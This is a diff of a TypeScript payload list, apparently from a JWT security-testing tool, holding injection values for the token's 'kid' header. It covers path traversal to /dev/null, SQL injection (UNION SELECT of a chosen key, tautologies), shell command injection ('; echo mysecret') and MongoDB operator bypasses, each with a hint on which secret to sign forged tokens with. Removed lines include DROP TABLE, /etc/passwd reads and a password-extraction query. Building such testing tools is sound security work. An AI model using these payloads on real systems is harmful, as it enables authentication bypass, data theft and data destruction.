@@ -1,116 +1,78 @@
 import type { KidPayload } from '../types/crypto.types'
 
 export const KID_PAYLOADS: KidPayload[] = [
-  // Path Traversal
+  // ── Path Traversal ──────────────────────────────────────────
+  // Server reads key from file: open(f"/keys/{kid}.pem").read()
   {
     category: 'path-traversal',
-    label: '/dev/null (empty key)',
+    label: '/dev/null → empty key',
     value: '../../dev/null',
-    secretHint: 'Server reads /dev/null → empty string',
+    secretHint: '/dev/null is always empty → sign with empty secret',
     secretValue: '',
   },
   {
     category: 'path-traversal',
-    label: '/dev/null (deeper)',
-    value: '../../../dev/null',
-    secretHint: 'Server reads /dev/null → empty string',
-    secretValue: '',
-  },
-  {
-    category: 'path-traversal',
-    label: '/dev/null (URL-encoded)',
+    label: '../../dev/null (URL-encoded)',
     value: '..%2F..%2Fdev%2Fnull',
-    secretHint: 'Server reads /dev/null → empty string',
-    secretValue: '',
-  },
-  {
-    category: 'path-traversal',
-    label: '../../etc/passwd',
-    value: '../../etc/passwd',
-    secretHint: 'Unknown — depends on /etc/passwd content',
+    secretHint: 'Same as above, URL-encoded variant',
     secretValue: '',
   },
 
-  // SQL Injection
+  // ── SQL Injection ───────────────────────────────────────────
+  // Server looks up key: SELECT key FROM keys WHERE kid = '{kid}'
   {
     category: 'sqli',
-    label: "OR '1'='1 (tautology)",
-    value: "' OR '1'='1",
-    secretHint: "Unknown — returns first key in DB. You need to know what that is.",
-    secretValue: '',
-  },
-  {
-    category: 'sqli',
-    label: 'UNION SELECT (controlled key)',
+    label: "UNION SELECT → controlled key",
     value: "' UNION SELECT 'mysecret' --",
-    secretHint: "The server will use 'mysecret' as the HMAC key",
+    secretHint: "You control the key: sign with 'mysecret'",
     secretValue: 'mysecret',
   },
   {
     category: 'sqli',
-    label: 'DROP TABLE keys',
-    value: "'; DROP TABLE keys --",
-    secretHint: 'Destructive — may drop the keys table before verification',
+    label: "OR '1'='1 → first key in DB",
+    value: "' OR '1'='1",
+    secretHint: "Returns the first key in the table — you need to know (or guess) what it is",
     secretValue: '',
   },
   {
     category: 'sqli',
-    label: "Admin comment-out",
+    label: "Comment-out → admin key",
     value: "admin' --",
-    secretHint: 'Unknown — returns admin key if it exists',
-    secretValue: '',
-  },
-  {
-    category: 'sqli',
-    label: 'OR 1=1 variant',
-    value: "' OR 1=1; --",
-    secretHint: 'Unknown — returns first row',
-    secretValue: '',
-  },
-  {
-    category: 'sqli',
-    label: 'UNION password extract',
-    value: "123' AND 1=0 UNION SELECT password FROM users WHERE '1'='1",
-    secretHint: 'Returns a password from users table',
+    secretHint: "Returns key for user 'admin' — you need to know admin's key",
     secretValue: '',
   },
 
-  // Command Injection
+  // ── Command Injection ───────────────────────────────────────
+  // Server does: os.popen(f"cat /keys/{kid}.pem").read()
   {
     category: 'command-injection',
-    label: 'cat /etc/passwd',
-    value: '; cat /etc/passwd',
-    secretHint: 'Unknown — depends on command output',
-    secretValue: '',
+    label: 'echo → controlled key',
+    value: "'; echo mysecret",
+    secretHint: "Outputs 'mysecret' as the key → sign with 'mysecret'",
+    secretValue: 'mysecret',
   },
   {
     category: 'command-injection',
-    label: 'whoami',
-    value: '| whoami',
-    secretHint: 'Unknown — depends on command output',
-    secretValue: '',
-  },
-  {
-    category: 'command-injection',
-    label: 'id command',
-    value: '$(id)',
-    secretHint: 'Unknown — depends on command output',
+    label: '/dev/null → empty key',
+    value: '; cat /dev/null',
+    secretHint: '/dev/null is empty → sign with empty secret',
     secretValue: '',
   },
 
-  // NoSQL Injection
+  // ── NoSQL Injection ─────────────────────────────────────────
+  // Server queries MongoDB: db.keys.findOne({ kid: kid })
   {
     category: 'nosql',
-    label: '$gt (MongoDB bypass)',
+    label: '$gt → bypass query',
     value: '{"$gt": ""}',
-    secretHint: 'Unknown — bypasses NoSQL queries',
+    secretHint: 'Bypasses the query — returns some key. You need to know which one.',
     secretValue: '',
   },
   {
     category: 'nosql',
-    label: '$ne (not-equal bypass)',
+    label: '$ne → bypass query',
     value: '{"$ne": null}',
-    secretHint: 'Unknown — bypasses NoSQL queries',
+    secretHint: 'Bypasses the query — returns a key where kid ≠ null.',
     secretValue: '',
   },
 ]
